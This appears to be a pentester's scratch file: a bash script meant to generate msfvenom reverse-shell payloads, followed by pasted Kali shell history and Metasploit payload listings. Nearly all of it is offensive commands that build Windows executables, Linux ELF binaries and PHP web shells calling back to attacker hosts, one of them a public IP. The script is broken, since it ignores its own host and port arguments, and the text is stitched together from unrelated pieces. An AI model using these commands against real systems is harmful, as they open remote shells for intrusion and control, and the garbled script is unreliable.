#!/bin/bash
# Generates various reverse msfvenom payloads for the given hostname/IP and port

if [ -z "$1" ] || [ -z "$2" ]; then
	echo "Usage: ./genvenom.sh <hostname/IP> <port>"
  exit 0
fi

HOST=$1
PORT=$2

# Generate meterpreter payloads for various architectures
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe > meterpreter-reverse_tcprevshell-443.exe
msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.197.135 LPORT=443 -f exe > meterp-revhttps-443.exe



root@kali:~/Documents/exploits# history | grep msfvenom
   80  msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe > revshell-443.exe
   82  msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe > revshell-443.exe
   85  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf > meterp-443.elf
  154  msfvenom
  192  history | grep msfvenom
  193  msfvenom -p windows/shell_reverse_tcp LHOST=172.16.197.135 LPORT=443 -f exe > revshell-443.exe
  194  msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.197.135 LPORT=443 -f exe > meterp-revhttps-443.exe
  335  msfvenom -p php/meterpreter_reverse_tcp LHOST=118.211.44.32 LPORT=443 -f raw > meterp.php
  363  msfvenom -p php/meterpreter_reverse_php LHOST=118.211.44.32 LPORT=443 -f raw > revshell.php
  364  msfvenom -p php/reverse_php LHOST=118.211.44.32 LPORT=443 -f raw > revshell.php
  553  history | grep msfvenom
  559  history | grep msfvenom
  
  msf exploit(handler) > set payload windows/meterpreter
set payload windows/meterpreter/bind_hidden_ipknock_tcp    set payload windows/meterpreter/reverse_ord_tcp
set payload windows/meterpreter/bind_hidden_tcp            set payload windows/meterpreter/reverse_tcp
set payload windows/meterpreter/bind_ipv6_tcp              set payload windows/meterpreter/reverse_tcp_allports
set payload windows/meterpreter/bind_ipv6_tcp_uuid         set payload windows/meterpreter/reverse_tcp_dns
set payload windows/meterpreter/bind_nonx_tcp              set payload windows/meterpreter/reverse_tcp_rc4
set payload windows/meterpreter/bind_tcp                   set payload windows/meterpreter/reverse_tcp_rc4_dns
set payload windows/meterpreter/bind_tcp_rc4               set payload windows/meterpreter/reverse_tcp_uuid
set payload windows/meterpreter/bind_tcp_uuid              set payload windows/meterpreter/reverse_winhttp
set payload windows/meterpreter/reverse_hop_http           set payload windows/meterpreter/reverse_winhttps
set payload windows/meterpreter/reverse_http               set payload windows/meterpreter_bind_tcp
set payload windows/meterpreter/reverse_http_proxy_pstore  set payload windows/meterpreter_reverse_http
set payload windows/meterpreter/reverse_https              set payload windows/meterpreter_reverse_https
set payload windows/meterpreter/reverse_https_proxy        set payload windows/meterpreter_reverse_ipv6_tcp
set payload windows/meterpreter/reverse_ipv6_tcp           set payload windows/meterpreter_reverse_tcp
set payload windows/meterpreter/reverse_nonx_tcp 

msf exploit(handler) > set payload linux/x86/meterpreter/
set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/meterpreter/reverse_ipv6_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/meterpreter/reverse_nonx_tcp
set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/meterpreter/reverse_tcp_uuid
set payload linux/x86/meterpreter/bind_tcp_uuid 


